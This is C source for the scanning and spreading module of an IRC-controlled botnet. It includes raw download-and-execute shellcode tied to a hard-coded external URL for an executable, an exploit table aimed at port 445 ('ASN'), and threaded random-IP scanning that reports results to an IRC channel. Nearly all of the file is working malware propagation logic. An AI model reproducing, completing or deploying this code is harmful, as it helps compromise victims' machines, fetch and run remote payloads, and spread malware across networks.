#include "../headers/includes.h"
#include "../headers/functions.h"
#include "../headers/externs.h"

#ifndef NO_ADVSCAN

unsigned char szShellCode[] =
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";

unsigned char szPage[] = "http://usuarios.lycos.es/genomano82/defcon.exe"; 

int iShellSize = sizeof( szShellCode );
int iPageSize = sizeof( szPage );

// globals
ADVINFO advinfo[MAX_THREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
//	{ "Name",		    "Port",		"Function" },

#ifndef NO_ASN
	{ "asn",			445,		 ASN },
#endif



	{ NULL,               0,	     NULL }
};

SCANALL scanall[]={
	{"asn", true},
};

int scanallsize=(sizeof(scanall)/sizeof(SCANALL));

char *MakeIP(char *ip,BOOL Random,int Class)
{
	if(!ip)
		return NULL;

	static char retip[16];
	ZeroMemory(retip,sizeof(retip));

	char *tokens[4];
	char ipbuf[16];
	strncpy(ipbuf,ip,16);
	tokens[0]=strtok(ipbuf,".");
	if(!tokens[0])
		return NULL;
	for(int i=1;i<4;i++) {
		tokens[i]=strtok(NULL,".");
		if(!tokens[i])
			return NULL;
	}
	if (Class==1) //A Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],(Random?"x":"0"),(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==2) //B Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==3) //C Class
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],tokens[2],(Random?"x":"0"));

	else
	{
		return NULL;
	}
	return retip;
}

void CurrentIP(void *conn, char *target, int threadnum)
{
	IRC* irc=(IRC*)conn;
	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;
		irc->privmsg(target,"%s Current IP: %s.",scan_title,finet_ntoa(in));
	} else 
		irc->privmsg(target,"%s Scan not active.",scan_title);
	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	
	IN_ADDR in;
	in.s_addr=ip;
	//no sense scanning ourself
	if (!strcmp(finet_ntoa(in),exip) || !strcmp(finet_ntoa(in),inip))
		return FALSE;

	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);
	
	if (findthreadid(SCAN_THREAD) == 1)
	{
		DeleteCriticalSection(&CriticalSection); // just in case
		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400))
		{
			// failed to initialize CriticalSection
			if (!scan.silent)
				irc->privmsg(scan.target,"%s Failed to initialize critical section, error: <%d>",scan_title,GetLastError());
			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++)
	{
		scan.cthreadid = i;
		scan.cthreadnum = addthread(SCAN_THREAD,"%s %s:%d, Scan thread: %d, Sub-thread: %d.",scan_title,scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} 
		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	if (!scan.silent && scan.verbose)
		irc->privmsg(scan.target,"%s Finished at %s:%d after %d minute(s) of scanning.",scan_title, finet_ntoa(in), scan.port, scan.minutes);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}



DWORD WINAPI AdvPortScanner(LPVOID param)
{
	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;
	scanp->cgotinfo = TRUE;

	IN_ADDR in;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP=AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP=AdvGetNextIP(threads[threadnum].parent);
		in.s_addr=dwIP;

		if (AdvPortOpen(dwIP,scan.port,scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				if (!scan.silent)
					irc->privmsg(scan.target,"%s Portscan: %s:%d open.",scan_title,finet_ntoa(in),scan.port);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				sprintf(exinfo.chan, scan.target);
				exinfo.silent = scan.silent;
				exinfo.verbose = scan.verbose;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(scan.target,irc,exinfo);
			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}
#endif
